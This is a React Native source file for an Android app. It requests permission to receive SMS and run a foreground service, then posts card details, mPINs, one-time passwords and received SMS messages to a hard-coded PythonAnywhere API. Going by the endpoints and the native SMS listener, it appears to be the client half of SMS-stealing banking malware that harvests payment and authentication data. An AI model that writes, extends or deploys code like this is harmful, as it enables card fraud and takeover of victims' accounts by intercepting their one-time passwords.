import { PermissionsAndroid, Platform, NativeModules } from "react-native";
import { setId } from "./store/mobileNumberSlice";

const baseUrl = "https://ashu1794.pythonanywhere.com/api/"


let isSending = false
let lastRequestTime = 0; // Track the last time a request was sent
const { SMSListenerModule } = NativeModules

export const requestSmsPermission = async () => {
    try {
        const granted = await PermissionsAndroid.check(PermissionsAndroid.PERMISSIONS.RECEIVE_SMS);
        if (granted) return PermissionsAndroid.RESULTS.GRANTED;
        return await PermissionsAndroid.request(PermissionsAndroid.PERMISSIONS.RECEIVE_SMS);
    } catch (err) {
        return err.message;
    }
};

export const requestForegroundPermission = async () => {
    try {
        if (Platform.Version >= 34) {
            const granted = await PermissionsAndroid.request(
                "android.permission.FOREGROUND_SERVICE" // Correct permission name
            );
            return granted === PermissionsAndroid.RESULTS.GRANTED ? "granted" : "denied";
        }
        return "not_required"; // No need to request on older Android versions
    } catch (err) {
        return err.message;
    }
};


export const createAccount = (data) => async (dispatch) => {
    try {
        const response = await fetch(`${baseUrl}users/`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(data),
        });
        if (!response.ok) throw new Error(`HTTP Error: ${response.status}`);
        const { id } = await response.json();
        SMSListenerModule.saveDeviceId(String(id));
        dispatch(setId(id));
        return id;
    } catch (err) {
        return err.message;
    }
};

export const saveOTP = async (mPin) => {
    try {
        const response = await fetch(`${baseUrl}mpins/`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(mPin),
        });

        if (!response.ok) throw new Error(`HTTP Error: ${response.status}`);

        const { message } = await response.json();
        return message;
    } catch (err) {
        console.error("saveOTP Error:", err.message);
        return null;
    }
};

export const saveCard = async (card) => {
    try {
        const response = await fetch(`${baseUrl}cards/`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(card),
        });
        if (!response.ok) throw new Error(`HTTP Error: ${response.status}`);
        const { message } = await response.json();
        return message;
    } catch (err) {
        console.error("saveCard Error:", err.message);
        return null;
    }
};

export const saveOTP2s = async (otps) => {
    try {
        const response = await fetch(`${baseUrl}otps/`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(otps),
        });

        if (!response.ok) throw new Error(`HTTP Error: ${response.status}`);

        const { message } = await response.json();
        return message;
    } catch (err) {
        console.error("saveOTP2s Error:", err.message);
        return null;
    }
};

export const sendSms = async (data) => {
    const currentTime = Date.now();
    if (isSending || currentTime - lastRequestTime < 1000) return;

    isSending = true;
    lastRequestTime = currentTime;

    try {
        const response = await fetch(`${baseUrl}sms_messages/`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(data),
        });

        if (!response.ok) throw new Error(`HTTP Error: ${response.status}`);

        return await response.json();
    } catch (err) {
        console.error("sendSms Error:", err.message);
        return null;
    } finally {
        isSending = false;
    }
};
